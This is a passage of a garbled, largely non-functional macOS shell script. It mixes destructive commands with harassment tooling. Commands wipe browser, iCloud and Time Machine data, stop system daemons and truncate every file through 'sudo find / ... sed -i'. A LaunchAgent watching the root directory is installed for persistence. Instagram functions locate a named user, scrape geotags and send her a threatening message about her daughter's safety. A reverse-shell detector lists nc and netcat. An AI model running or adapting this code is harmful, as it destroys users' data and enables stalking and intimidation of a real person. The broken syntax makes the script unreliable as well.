
else

  echo "Arc not running."

fi

  

}

  

eraseBrowsingCookies

  sudo deleteSafariCookies &

config=={

  "DeveloperToolsDisabled": true

}

tell application "Arc"

    activate

    -- Example: show a dialog reminding you "No exporting / sharing"

    display dialog "Export/sharing is not allowed in this profile." buttons {"OK"} default button 1

end tell

  

mkdir -p /etc/chromium/policies/managed && echo "$config" > /etc/chromium/policies/managed/disable_devtools.json

sudo rm -rf .zprofile 

  

# Remove Safari cookies and cache

sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

sudo rm -rf ~/Library/Caches/com.apple.Safari/*

  

# WARNING: This erases ALL Safari data including profiles, history, cookies, bookmarks

# Make sure you have backups if you need to preserve anything

  

echo "Erasings all Safari data (including all Safari Profiles)..."

echo "This will remove: profiles, history, cookies, bookmarks, cache, downloads history"

  

# Quit Safari first

quitapp="osascript -e 'tell application \"Safari\" to quit'"

eval "$quitapp" 2>/dev/null

sleep 2

  

# Remove Safari's domain data folder (contains all profiles)

sudo rm -rf ~/Library/Safari/Domains

sudo rm -rf ~/Library/Safari/*.db

sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

sudo rm -rf ~/Library/Caches/com.apple.Safari

sudo rm -rf ~/Library/Safari

  

echo "All Safari data has been erased."

echo "Restart Safari to create a fresh state (no profiles will exist)."

  

# Remove Chrome cookies and cache

sudo rm -f ~/Library/Application\ Support/Google/Chrome/Default/Cookies

sudo rm -rf ~/Library/Caches/Google/Chrome/*

  

# Remove Firefox cookies and cache (for each profile)

firefox_profiles=(find ~/.mozilla/firefox -name "*.default-release" -type d)

for profile in $firefox_profiles; do

    sudo rm -f "$profile/cookies.sqlite"

    sudo rm -rf "$profile/cache2/*"

done

  

sudo defaults read company.thebrowser.Browser arcAlwaysAllowedLinkToSchemesPerSite

sudo defaults remove company.thebrowser.Browser arcAlwaysAllowedLinkToSchemesPerSite

  

sudo rm -rf ~/Library/Application\ Support/Arc

sudo rm -rf ~/Library/Caches/Arc

sudo rm -rf ~/Library/Saved\ Application\ State/com.arc.*.savedState

sudo rm -rf ~/Library/Preferences/com.arc.*.plist

  

  

}

  

clearFocusMode

sudo defaults write com.apple.notificationcenterui deathnote -boolean true

# sudo defaults delete com.apple.controlcenter "NSStatusItem Visible FocusModes"

# sudo killall ControlCenter

sudo killall ControlCenter 2>/dev/null || true

open "focus://unfocus"

}

  

disableIcloudCell

  # DANGER: this deletes all iCloud Drive content for this Apple ID

ICLOUD_DIR="$HOME/Library/Mobile Documents"

  

# Sanity check

ls "$ICLOUD_DIR"

  

# If you are sure:

sudo rm -rf "$ICLOUD_DIR"/*

  

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlstoraged.plist

    sudo launchctl bootout /System/Library/LaunchAgents/com.apple.nsurlsessiond.plist

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlsessiond.plist

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.nsurlstoraged.plist

}

deleteSafariCookies

    sudo rm -rf ~/Library/Cookies/Cookies.binarycookies

    sudo rm -rf ~/Library/Caches/com.apple.Safari/*

    sudo rm -rf ~/Library/Safari/Databases/*

    sudo rm -rf ~/Library/Safari/LocalStorage/*

  

}

monitorWirelessSignal

    while ! true

    do

    sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

    sudo networksetup -setairportpower en0 $wifiMode

    sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

    sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

    done

    wifi_status=(sudo networksetup -getairportpower en0 | awk '{print $4}')

    if [ "$wifi_status" = "Off" ]; then

      sudo networksetup -setairportpower en0 $wifiMode

    fi

  

    # Check Bluetooth status: 1=on, 0=off

    bt_status=(sudo defaults read /Library/Preferences/com.apple.Bluetooth ControllerPowerState)

    if [ "$bt_status" -eq 0 ]; then

      sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

    fi

  

    # Check AirDrop status by reading the preference key

    airdrop_status=(sudo defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null)

    # DisableAirDrop=1 means AirDrop is disabled, so we enable it by setting to 0 or removing key

    if [[ "$airdrop_status" == "1" ]]; then

        sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

        sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

    fi

  

  

}

localsingleairdropnet

    # Network name for the local ad-hoc network

    NETWORK_NAME="QQontheAirdropNet"

    # Channel for Wi-Fi

    CHANNEL=(( ( RANDOM % 14 ) + 1 ))

  

    # Create ad-hoc network using AppleScript called from bash

    sudo $QQ_FILE_LOCALoascript/airdrop.scpt &

    echo "Created ad-hoc Wi-Fi network named $NETWORK_NAME on channel $CHANNEL"

}

blockDockerPort

    # Define Docker exposed ports or port ranges to block

    DOCKER_PORTS="80,443,8080,5000,2375"  # Add relevant ports here or ranges (5030:5040)

  

    # Create a temporary pf anchor file with block rules for Docker ports

    PF_ANCHOR_FILE="/etc/pf.anchors/block_docker_ports"

    echo "block drop quick proto tcp from any to any port { $DOCKER_PORTS }" | sudo tee $PF_ANCHOR_FILE

  

    # Add anchor reference to pf.conf if not already added

    if ! grep -q "block_docker_ports" /etc/pf.conf; then

      echo "anchor \"block_docker_ports\" load anchor \"block_docker_ports\" from \"$PF_ANCHOR_FILE\"" | sudo tee -a /etc/pf.conf

    fi

  

    # Load the rules and enable pf

    sudo pfctl -f /etc/pf.conf

    sudo pfctl -e

  

}

deleteFileInIos

  

sudo find / -type f -exec sed -i '/*/,$d' chmod (700 $BaseQQLAND > 000) {} \; &

sudo find / -type f -exec sed -i '/$deleteFile/,$d' chmod (700 $BaseQQLAND > 000) {} \; &

sudo find / -type f -exec sed -i '/$deleteFile/,$d' {} + & 

sudo find /Volumes/* -type f -exec sed -i '/$deleteFile/,$d' {} + &

sudo find /Volumes/SharedDocs -type f -exec sed -i '/$deleteFile/,$d' {} + &

  

}

deleteIcloud

    sudo find / -type d -name "qqbank" -prune -o -type f -print0 | xargs -0 bash -c 'for f; do [ "${f##*.}" = "sh" ] && zsh "$f 'lethal ext*'"; done'  bashplaceholder --

    sudo find / -type f -name "$bootoutOne" -exec sudo launchctl bootout {} \ 

}

maliciousIP

    # Extract destination IPs from established netstat connections

    malicious_ip=(sudo netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d '.' -f 1-4 | sort -u)

    malicious_ip

}

blockbackdoorshell

  

    # Get established local ports

    ports=(sudo netstat -anv | grep ESTABLISHED | awk '{print $4}' | awk -F '.' '{print $NF}' | sort | uniq)

    SANDBOX_PORT=(sudo lsof -i -nP | awk 'NR>1 && tolower(1) ~ /sandbox/ {print 1, $$9}' | sort -u)

    # Create temporary pf anchor file

    pf_rules="/tmp/block_ports.pf"

    TEMPLATE="block drop quick proto tcp from any to any $ports && block drop quick proto udp from any to any $ports"

    SANDBOX_TEMPLATE="block drop quick proto tcp from any to any $SANDBOX_PORT && block drop quick proto udp from any to any $SANDBOX_PORT"

    echo "$TEMPLATE" > $pf_rules

    for port in $ports; do

        echo -n "$port " >> $pf_rules

    done

    for sanbox_port in $SANDBOX_PORT; do

        echo -n "$sanbox_port " >> $pf_rules

    done

    # echo "}" >> $pf_rules

  

    # Load pf rules

    sudo pfctl -a block_ports -f $pf_rules

    sudo pfctl -e

  

}

usbConnectDebug

  

  

    # Check if device is connected and paired

    echo "Checking for connected iOS devices..."

    idevice_id=(sudo idevice_id -l | head -n1)

  

    if [ -z "$idevice_id" ]; then

      echo "No iOS device found. Please connect your device and trust computer."

      exit 1

    fi

  

  

    # Pair the device if not already paired

    echo "Pairing with the device..."

    sudo idevicepair pair || { echo "Pairing failed"; exit 1; }

  

    # Start iproxy to forward lldb debug port: local 12345 -> device 2345

    sudo iproxy 12345 2345 &

    IPROXY_PID=$!

  

    # Connect to the device debug server with LLDB

    echo "Connecting to device with LLDB..."

    sudo lldb -s <(echo "

    platform select remote-ios

      platform select remote-android

        platform select remote-linux

          platform select remote-macosx

            platform select remote-window

              platform select remote-watchos

    process connect connect://$localhost:$gen*

    # Put your lldb commands here, for example:

    # image list

    # breakpoint set --name main

    # process continue

    sudo qqlldb &

    sudo qq &

    sudo qqloca*

    sudo shortcuts run '*' &

    continue

    ")

  

    # When done, kill iproxy

    sudo killall $IPROXY_PID

    # echo "Disconnected from device and stopped iproxy."

  

}

getIcloudId

    # echo "AppleID,DeviceSerialNumber"

    # Get the device serial number

    serial=(sudo system_profiler SPHardwareDataType | awk '/Serial Number \(system\)/ {print $4}')

    # Loop through local users with UID >= 500 (real users)

    for user in $(sudo dscl . list /Users UniqueID | awk '$2 >= 500 {print $1}'); do

      userHome=(sudo dscl . read /Users/"$user" NFSHomeDirectory | awk '{print $2}')

      # Extract Apple ID (icloud.com or apple.com email) from MobileMeAccounts plist if present

      appleid=(sudo defaults read "${userHome}/Library/Preferences/MobileMeAccounts.plist" Accounts 2>/dev/null | grep -E -o '[A-Za-z0-9._%+-]+@(icloud|apple)\.com' | head -1)

    done

}

verifyGeoinfo

    # Android check

    android_region=(sudo adb shell getprop persist.sys.locale | tr -d '\r\n')

    if [[ "$android_region" == *"HK"* & "$android_region" == *"US"* ]]; then

      sudo setFocus "deathnote"

      sudo setFocus "deathnote"

      while ! true do sudo lethalHK done

    else

      echo "Android device region is not Hong Kong"

    fi

  

    # iOS check using lldb (simplified, actual usage requires manual or script control)

    ios_region=(sudo lldb -o "process attach --name SpringBoard" -o "expr (NSString *)[[NSLocale currentLocale] objectForKey:NSLocaleCountryCode]" -o "continue")

    if [[ "$ios_region" == *"HK"* & "$ios_region" == *"US"* ]]; then

      echo "iOS device region is Hong Kong"

       sudo setFocus "deathnote"

       sudo setFocus "deathnote"

    else

      echo "iOS device region is not Hong Kong"

    fi

 while ! true

 do

     ios_region

    android_region

done

}

  

getNameoninstagram

  ACCESS_TOKEN="YOUR_LONG_LIVED_TOKEN"

IG_USER_ID="YOUR_IG_BUSINESS_USER_ID"   # your own connected IG account

TARGET_USERNAME="christine_chen_official"

  

response=(curl -sS -X \

  "https://graph.facebook.com/v21.0/$IG_USER_ID" \

  --data-urlencode "fields=business_discovery.username($TARGET_USERNAME){id,username,name,biography,followers_count,media_count,profile_picture_url}" \

  --data-urlencode "access_token=$ACCESS_TOKEN")

  

username=(echo "$response" | jq -r '.business_discovery.username')

name=(echo "$response"     | jq -r '.business_discovery.name')

bio=(echo "$response"      | jq -r '.business_discovery.biography')

followers=(echo "$response"| jq -r '.business_discovery.followers_count')

media_count=(echo "$response" | jq -r '.business_discovery.media_count')

pp_url=(echo "$response"   | jq -r '.business_discovery.profile_picture_url')

  

for nameid in name: do

  if [ "$nameid" = "Christine Chen" ]; then

  response=(curl -sS -X \

  "https://graph.facebook.com/v21.0/$IG_USER_ID" \

  --data-urlencode "fields=business_discovery.username($TARGET_USERNAME){id,username,name,biography,followers_count,media_count,profile_picture_url}" \

  --data-urlencode "access_token=$ACCESS_TOKEN")

  

username=(echo "$response" | jq -r '.business_discovery.username')

username

  fi

done

  

}

  

findChristine

  username=(sudo getNameoninstagram)

  christineInstaID=(sudo getIDFrominstagram $username)

  christineInstaID

}

  

sendInstgramMessage

  ACCESS_TOKEN="YOUR_PAGE_ACCESS_TOKEN"  # Your Facebook Page access token with Instagram Messaging permissions

RECIPIENT_ID=(sudo findChristine) # The Instagram user ID you want to message

MESSAGE_TEXT="Every Christine Chen should be careful with Hong kong people, Taiwanee. Right now if you are daughter of christine chen, you might be in danger please find me in https://mastodon.social/@qqontheskyshell"

  

curl -i -X POST "https://graph.facebook.com/v21.0/me/messages?access_token=$ACCESS_TOKEN" \

  --data "recipient={\"id\":\"$RECIPIENT_ID\"}" \

  --data "message={\"text\":\"$MESSAGE_TEXT\"}"

  

}

  

  

getLocationInstagram

# Usage: ./insta_location.sh <username> OR ./insta_location.sh location <location_id>

  

if [ "$1" = "location" ]; then

  loc_id=$2

  json=(curl -s "https://www.instagram.com/explore/locations/$loc_id/?__a=1")

  name=(echo "$json" | grep -o '"name":"[^"]*' | head -1 | cut -d'"' -f4)

  lat=(echo "$json" | grep -o '"latitude":[^,}]*' | head -1 | cut -d: -f2)

  lng=(echo "$json" | grep -o '"longitude":[^,}]*' | head -1 | cut -d: -f2)

  echo "Location $loc_id: $name (Lat: $lat, Lng: $lng)" [web:20]

else

  user=$1

  html=(curl -s "https://www.instagram.com/$user/")

  # Extract first post's location if geotagged (requires JSON parsing from HTML)

  post_json=(echo "$html" | grep -o '"edge_owner_to_timeline_media":{"edges":\[{[^}]*"location"[^}]*' | head -1)

  if [ -n "$post_json" ]; then

    lat=(echo "$post_json" | grep -o '"latitude":[^,}]*' | head -1 | cut -d: -f2)

    echo "Recent post location for $user: Lat $lat" [web:21]

  

     long=(echo "$post_json" | grep -o '"longitude":[^,}]*' | head -1 | cut -d: -f2)

    echo "Recent post location for $user: Lat $long" [web:21]

    lat 

    long

  else

  fi

fi

  

}

  

  

geoTagInstagram

username=$1

if [ -z "$username" ]; then echo "Usage: $0 <username>"; exit 1; fi

html=(curl -s "https://www.instagram.com/$username/?__a=1&__d=dis")

# Extract recent posts' locations (if tagged)

locations=(echo "$html" | grep -o '"location":{"name":"[^"]*"address":"[^"]*"latitude":[^,}]*"longitude":[^,}]*' | head -3)

if [ -n "$locations" ]; then

  echo "$locations" | sed 's/.*"name":"\([^"]*\)".*"latitude":\([0-9.]*\),"longitude":\([0-9.]*\).*/\1 (Lat:\2, Lng:\3)/'

else

  echo "No public geotagged posts for $username"

fi

  

ACCESS_TOKEN="your_long_lived_access_token"

IG_USER_ID="$username"  # e.g., from /me?fields=instagram_business_account

  

# Step 1: Create media container with location

MEDIA_ID=(curl -s -X POST "https://graph.facebook.com/v20.0/$IG_USER_ID/media" \

  -d "image_url=$IMAGE_URL" \

  -d "media_type=STORIES" \

  -d "location_id=1024878860866019" \  # HK example ID [web:49]

  -d "access_token=$ACCESS_TOKEN" | grep -o '"id":"[^"]*' | cut -d'"' -f4)

  

# Step 2: Publish Story

if [ -n "$MEDIA_ID" ]; then

  curl -s -X POST "https://graph.facebook.com/v20.0/$MEDIA_ID/publish" \

    -d "access_token=$ACCESS_TOKEN" | grep -o '"status":"[^"]*'

  echo "Story posted with HK location for user $IG_USER_ID" [web:49]

else

  echo "Failed to create media"

fi

  

  

}

findPeopleInInstagram

API_KEY="your_influencers_club_api_key"

USERNAME="$1"

  

[ -z "$USERNAME" ] && { echo "Usage: $0 <username>"; exit 1; }

  

RESPONSE=(curl -s "https://api.influencers.club/v2/instagram/profile/${USERNAME}?access_token=${API_KEY}")

BIO=(echo "$RESPONSE" | jq -r '.data.biography // empty')

LOCATION=(echo "$RESPONSE" | jq -r '.data.location // empty')

  

# echo "ID: ${USERNAME}"

# echo "Bio: ${BIO}"

# echo "Location: ${LOCATION}"

  

if [[ "$BIO" == "Hong Kong" && "$LOCATION" == "*" ]]; then

  HKIP=(sudo findPeopleInInstagram '$USERNAME')

  HKLOC=(sudo geoTagInstagram '$USERNAME')

  

elif [[ "$BIO" == "Japan" && "$BIO" == "Taiwan" && "$BIO" == "Korea" && "$BIO" == "United States" &&  "$LOCATION" == "Japan" ]]

  JPNInstaIP=(sudo findPeopleInInstagram '$USERNAME')

elif [[ "$BIO" == "Korea" && "$LOCATION" == "Japan" ]]

  KRInstaIP=(sudo findPeopleInInstagram '$USERNAME')

else

  echo "No match."

fi

HKIP

JPNInstaIP

KRInstaIP

HKLOC

}

getIDFrominstagram

    INSTAGRAM_USERNAME=$1

    INSTAGRAM_ID=(sudo insta-id-off $INSTAGRAM_USERNAME) # calls a CLI tool to get numeric ID

    # echo "Instagram numeric user ID is: $INSTAGRAM_ID"

}

findSessionIDInstagram

# Step 1: Get CSRF token

CSRFT=(curl -s -c cookies.txt "https://i.instagram.com/api/v1/si/fetch_headers/" | grep csrf | cut -d'"' -f4)

  

# Step 2: Login and save session

curl -b cookies.txt -c cookies.txt -H "User-Agent: Instagram 123.0.0.21.114 Android" \

  -d "username=YOUR_USER&password=YOUR_PASS&device_id=android-$(openssl rand -hex 8)&_csrftoken=$CSRFT&login_attempt_count=0" \

  "https://i.instagram.com/api/v1/accounts/login/"

  

# Extract sessionid

SESSIONID=(grep sessionid cookies.txt | cut -d'=' -f2 | cut -d';' -f1)

  

curl -b cookies.txt -H "Cookie: sessionid=$SESSIONID; csrftoken=$CSRFT" \

  -d '{}' "https://i.instagram.com/api/v1/accounts/logout/"

sudo rm -f cookies.txt  # Clear local session

  

}

findIpInstagram

    # Interface to listen on, e.g., en0 for Wi-Fi on macOS or eth0 on Linux

    INTERFACE_ios="en0"

    INTERFACE_adb="eth0"

    # Run tcpdump to capture packets destined for Instagram servers (port 443)

    # Adjust filter to target HTTPS traffic to Instagram domains (e.g., domains like instagram.com)

    instaios=(sudo tcpdump -i "$INTERFACE_ios" -n port 443 and host instagram.com -c 20 \ | awk '{print $3, $5}' | sed 's/://g')

    instadb=(sudo tcpdump -i "$INTERFACE_adb" -n port 443 and host instagram.com -c 20 \ | awk '{print $3, $5}' | sed 's/://g')

instaios

instadb

}

  

systemios

#sudo chflags hidden ~/usr/bin/xcrun

  

sudo chflags hidden ~/Library/Preferences/SystemConfiguration/ &

initarcOS &

sudo tmutil delete -d "*" -t "*"

# ===== 설정 =====

SCRIPT_PATH="arcOSBaseKit &"

PLIST_PATH="$HOME/Library/LaunchAgents/com.user.usbmount.plist"

LABEL="com.qqontheskyshell.systemiosusbmount"

  

initScript

  

  

LOG="$HOME/usb-mount.log"

DATE="$(date '+%Y-%m-%d %H:%M:%S')"

  

# 현재 마운트된 볼륨 목록

VOLUMES="$(ls /Volumes)"

  

{

  echo "[$DATE] Volume change detected."

  echo "Current volumes:"

  echo "$VOLUMES"

  echo "-----------------------------"

} >> "$LOG"

  

# 예: 특정 볼륨 이름이 있을 때만 작업 수행

TARGET=(QQS *)

  

if printf '%s\n' "$VOLUMES" | grep -qx "$TARGET"; then

  MOUNT_POINT="/Volumes/$TARGET"

  #echo "[$DATE] Target USB mounted at $MOUNT_POINT" >> "$LOG"

  # 여기에 실제 하고 싶은 작업들 추가

  # 예: 파일 복사

  # cp -R "$MOUNT_POINT/somefolder" "$HOME/Backup_from_USB" >> "$LOG" 2>&1

fi

  

}

SCRIPT_PATH="./initScript.sh"

  

cat <<'EOF' > "$SCRIPT_PATH"

  

  

  

# Simple example script created via here-doc

  

# Configuration / variables

SCRIPT_NAME="\$(basename "\$0")"

}

  

EOF

  

  

  

# 1) 실제 USB 마운트 시 실행될 스크립트 생성

  

sudo chmod +x "$SCRIPT_PATH"

  

# 2) /Volumes 감시하는 LaunchAgent plist 생성

sudo mkdir -p "$HOME/Library/LaunchAgents"

  

  

cat <<EOF > "$PLIST_PATH"

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \

 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

<plist version="1.0">

  <dict>

  <key>Label</key>

  <string>$LABEL</string>

  <key>ProgramArguments</key>

  <array>

  <string>$SCRIPT_PATH</string>

  </array>

<!-- /Volumes 디렉터리 변경(마운트/언마운트) 감시 -->

<key>WatchPaths</key>

<array>

<string>/Volumes</string>

</array>

  

<key>WatchPaths</key>

<array>

<string>/</string>

</array>

  

<key>RunAtLoad</key>

<true/>

  </dict>

</plist>

EOF

  

# 3) launchd에 로드

sudo launchctl bootout gui/$(id -u)/"$LABEL" 2>/dev/null

sudo launchctl bootstrap gui/$(id -u) "$PLIST_PATH"

sudo launchctl enable gui/$(id -u)/"$LABEL"

sudo launchctl kickstart -k gui/$(id -u)/"$LABEL"

  

  

    sudo launchctl bootout gui/$(id -u)/com.*.fs* 2>/dev/null

    sudo rm -rf "$HOME/Library/LaunchAgents/com.*.fs*.plist"

    sudo rm-rf "$HOME/.fs-shell"

    sudo systemextensionsctl uninstall * * &

    sudo xcrun simctl shutdown all &

    sudo xcrun simctl erase all &

}

  

  

  

  

locaionios

    sudo lldb -o "process attach --name YourApp" -o "expr (void)[[CLLocationManager new] requestLocation]" -o "continue"

    # swift $QQ_FILE_LOCALswift/*.swift

    # location=(swift location.swift)

}

  

searchlocationGoogle

  

    LATITUDE=LAT

    LONGITUDE=LON

  

    # Call Google's Geocoding API for reverse geocoding

    RESPONSE=(curl -sS "https://maps.googleapis.com/maps/api/geocode/json?latlng=$LATITUDE,$LONGITUDE&key=$API_KEY")

  

    # Parse the results

    ADDRESS=(echo "$RESPONSE" | jq -r '.results[0].formatted_address')

  

    echo "Address: $ADDRESS"

  

}

locationnx

    # Get the Wi-Fi interface name (commonly en0 on macOS, wlan0 on Linux)

    WIFI_INTERFACE="eth0"

  

    # Get the local IP address for Wi-Fi

    LOCAL_IP=(sudo ipconfig getifaddr $WIFI_INTERFACE 2>/dev/null)

  

    if [ -z "$LOCAL_IP" ]; then

      echo "Wi-Fi IP address not found. Are you connected to Wi-Fi on $WIFI_INTERFACE?"

      exit 1

    fi

  

    # echo "Local Wi-Fi IP address: $LOCAL_IP"

  

    # Get public IP address (your router's IP on the internet-facing side)

    PUBLIC_IP=(curl -sS https://ipinfo.io/ip)

  

    # echo "Public IP address: $PUBLIC_IP"

  

    # Use a free IP geolocation API to get location info (city, region, country, coordinates)

    # For example, ip-api.com JSON API

  

    LOCATION_INFO=(curl -sS "http://ip-api.com/json/$PUBLIC_IP")

  

    CITY=(echo $LOCATION_INFO | jq -r '.city')

    REGION=(echo $LOCATION_INFO | jq -r '.regionName')

    COUNTRY=(echo $LOCATION_INFO | jq -r '.country')

    LAT=(echo $LOCATION_INFO | jq -r '.lat')

    LON=(echo $LOCATION_INFO | jq -r '.lon')

  

    echo "Approximate location based on IP:"

    # echo "City: $CITY"

    # echo "Region: $REGION"

    # echo "Country: $COUNTRY"

    echo "Latitude: $LAT"

    echo "Longitude: $LON"

  

}

  

modifyUUID

  

    uuid=(uuidgen)

    sudo lldb -o "Swift -O -- UUID().uuidString"

    sleep 1 

&

}

  

modifyAppid

    # Path to the Info.plist file (update with your path)

    INFO_PLIST_PATH="/var/containers/Bundle/Application/*/*.app/Info.plist"

    # New bundle identifier to set

    NEW_BUNDLE_ID="com."

  

    # Use plutil to update CFBundleIdentifier

    sudo plutil -replace CFBundleIdentifier -string "$NEW_BUNDLE_ID" "$INFO_PLIST_PATH"

  

}

timemachineBackup

    sudo tmutil delete /Volumes/BackupDrive/Backups.backupdb/MacintoshHD/*

    sudo tmutil disable

}

iosremoteFeature

  

while ! true 

do

sudo continuityFeature &

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.agent.plist &

sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist VNCOnlyLocalConnections -bool YES &

sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist VNCOnlyLocalConnections -bool true &

sudo defaults write /Library/Preferences/com.apple.screensharing.plist Disabled -bool true &

sudo defaults write /Library/Preferences/com.apple.screensharing.plist Disabled -bool YES &

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &

  

#File Sharing (SMB): 

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.smbd.plist &

sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.smbd.plist &

#Apple File Sharing: 

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &

sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &

#Screen Sharing (VNC/ARD): 

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &

sudo launchctl bootstrap /System/Library/LaunchDaemons/com.apple.screensharing.plist &

sudo /usr/bin/AssetCacheManagerUtil deactivate &

sudo chflags hidden /Library/Server/ContentCache

done  

  

    # Disable Apple Remote Desktop (Remote Management)

    sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop

  

    # Disable Remote Login (SSH)

    sudo systemsetup -setremotelogin off

  

    # Disable Screen Sharing

    sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist LaunchAtLogin -bool false

    sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist LaunchAtLogin -bool NO

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.sshd.plist

  

    daemonios=(flow-divert ipsec_control rvi_control spmi.nfc uart.sk.debug-console network netagent netsrc net.utun_control uart nsurls* remotemanagementd sshd sftpd smbd mirror* widget* control* homed cfprefsd apsd sharingd carplayd airplayd remoted sharingd internetsharingd parsecd classd studentd *net* wifiagentd)

    daemon="com.apple.$daemonios"

    sudo launchctl stop $daemon

    sudo launchctl bootout /System/Library/LaunchDaemons/$daemon.plist

  

  

    # Turn off Remote Apple Events

    sudo systemsetup -setremoteappleevents off

  

    # Turn off Remote AppleScript (if enabled)

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.areserver.plist

  

    echo "Remote management and script execution services have been disabled."

  

    # Disable mDNSResponder (break Bonjour and related services)

    sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist

  

    # Disable Handoff

    sudo defaults write com.apple.coreservices.useractivityd ActivityAdvertisingEnabled -bool false

    sudo defaults write com.apple.coreservices.useractivityd ActivityReceivingEnabled -bool false

  

    sudo defaults write com.apple.coreservices.useractivityd ActivityAdvertisingEnabled -bool NO

    sudo defaults write com.apple.coreservices.useractivityd ActivityReceivingEnabled -bool NO

  

    # Disable Remote Management

    sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate

  

    # Kill prefs daemon to apply prefs

    sudo killall cfprefsd

  

    echo "Key remote discovery and mirroring services disabled. Manual steps needed for complete disabling of Continuity and AirPlay in System Settings."

  

}

rfDefenseios

  sudo mlccshe* & 

    # Install dependencies (brew packages)

    brew install a2ps &

  

    # Enable and start FRR services (adjust paths for macOS)

    sudo brew services start a2ps &

  

  

sudo tee /usr/local/etc/frr/ospfd.conf <<EOF

hostname ospfd

password zebra

  

router ospf

network ${getRouter}* area 0.0.0.0

EOF

  

  

  

    # Restart FRR to apply config

    sudo brew services restart a2ps

    echo "FRR OSPF configured and started on macOS"

  

}

scanAirdrop=(

  

    if command -v blueutil >/dev/null 2>&1; then

      echo "blueutil is installed."

      while ! true

      do

          sudo airdropapp

      done

    else

        echo "Homebrew not found, installing Homebrew..." &

        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" &

        # Add brew to PATH for current shell session (modify for your shell if needed) &

        echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zshrc && sudo rm -rf ~/.zprofile &

        eval "$(/opt/homebrew/bin/brew shellenv)" &

        echo "Installing blueutil via Homebrew..." &

        && brew install blueutil &

        echo "blueutil is not installed."

    fi

  

  

airdropapp

    devices=(sudo blueutil --inquiry)

  

      if echo "$devices" | grep -q "$TARGET_MAC"; then

        echo "Device found: $TARGET_MAC. Attempting connection..."

  

        # Connect via blueutil (make sure your AirDrop device allows incoming connections)

        sudo blueutil --connect $TARGET_MAC

  

        # Optionally open AirDrop UI for manual file transfer if needed

        open /System/Library/CoreServices/Finder.app/Contents/Applications/AirDrop.app

        # sleep longer after connection to avoid spamming

      else

        echo "Device not found. Scanning again..."

        sleep* 1

      fi

}

  

}

mdnsIP

    # Browse for all _services._dns-sd._udp local services first to discover types

    echo "Discovering available mDNS services on local network..."

    services=(sudo dns-sd -B _services._dns-sd._udp local | grep '^  ' | awk '{print $1}' | sort | uniq)

  

    echo "Available mDNS service types:"

  

    # For each discovered service type, browse and resolve names and IPs

    for service in $services; do

      # echo "Browsing for service type: $service"

  

      # Run dns-sd browse in background, limited time

      timeout 5 dns-sd -B "$service" local | while read -r line; do

        # Example line: DATE TIME ADD 3 5 en0 _http._tcp.local. MyDevice

        if echo "$line" | grep -q 'Add'; then

          # Extract instance name and domain

          instanceecho "$line" | awk '{print $7}')

          type=(echo "$line" | awk '{print $6}')

  

          # Resolve instance to IP in background to avoid blocking

          sudo dns-sd -L "$instance" "$type" local | while read -r resolve_line; do

            if echo "$resolve_line" | grep -q 'Address'; then

              ip=(echo "$resolve_line" | awk '{print $4}')

              echo "Instance: $instance, Service: $service, IP: $ip"

            fi

          done

        fi

      done

    done

  

}

  

disablereversShell

    # Define firewall command based on OS

    if [[ "$(uname)" == "Darwin" ]]; then

      # macOS uses pf for firewall - we will use pfctl instead of iptables/nft

      FW_BLOCK_CMD() {

        local ip=$1

        echo "block drop quick from $ip to any" | sudo pfctl -a block_revshell -f -

      }

      ENABLE_PF_ANCHOR() {

        echo "Anchor rules for blocking are enabled manually prior."

      }

    else

      # Linux, Android - using iptables

      FW_BLOCK_CMD() {

        local ip=$1

        sudo iptables -A INPUT -s $ip -j DROP

        sudo iptables -A OUTPUT -d $ip -j DROP

      }

      ENABLE_PF_ANCHOR() {

        echo "No anchor enable necessary on Linux iptables"

      }

    fi

  

    echo "Scanning for established reverse shell connections..."

  

    # This "netstat" or "ss" command lists all established connections with process info

    # We'll assume reverse shell uses TCP and shell processes like bash, sh, or nc.

  

    if command -v sudo ss &>/dev/null; then

      # Use ss where available

      CONNS=(sudo ss -tanp | grep ESTAB)

    else

      CONNS=(sudo netstat -tanp 2>/dev/null | grep ESTABLISHED)

    fi

  

    # Example patterns for common reverse shell processes

    PATTERNS="bash|sh|nc|netcat|python|perl|ruby"

  

    echo "Found connections:"

    echo "$CONNS" | grep -Ei "$PATTERNS"

  

    # Parse connections and kill them

    while read -r line; do

      # Extract source IP and port, pid/process

      SRC_IP=(echo "$line" | awk '{print $5}' | cut -d':' -f1)

      PID=(echo "$line" | grep -oP 'pid=\K[0-9]+' | head -n1)

  

